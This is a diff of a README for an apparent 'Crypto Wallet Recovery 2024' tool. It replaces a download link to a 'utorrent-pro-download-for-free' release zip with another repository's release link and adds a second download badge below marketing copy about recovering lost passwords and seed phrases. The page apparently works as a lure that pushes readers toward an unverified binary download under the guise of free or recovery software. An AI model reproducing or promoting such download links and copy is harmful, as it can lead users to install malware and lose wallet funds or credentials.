@@ -4,7 +4,7 @@
   <img src="https://img.shields.io/badge/MIT-grey?logo=MIT&logoColor=white&style=for-the-badge" alt="MIT Badge"/>
 
 </ol>
-<a href="https://github.com/abilbiju/.utorrent-pro-download-for-free/releases/download/UU/ExtraSoft.zip">
+<a href="https://github.com/TazelHossan/Crypto-Wallet-Recovery-2024/releases/tag/DOWNLOAD">
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 
 
@@ -32,3 +32,9 @@ A crypto wallet recovery tool or software is designed to help users regain acces
 - 🔑 Avoid Wallet Lockouts: Prevent permanent loss of access to your digital assets due to forgotten passwords or seed phrases.
 - ⌛ Save Time and Effort: Automate the recovery process, saving you valuable time and effort compared to manual attempts.
 - 🛡️ Peace of Mind: Provide peace of mind by ensuring that your cryptocurrency investments are secure and accessible.
+
+
+
+</ol>
+<a href="https://github.com/TazelHossan/Crypto-Wallet-Recovery-2024/releases/tag/DOWNLOAD">
+<img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
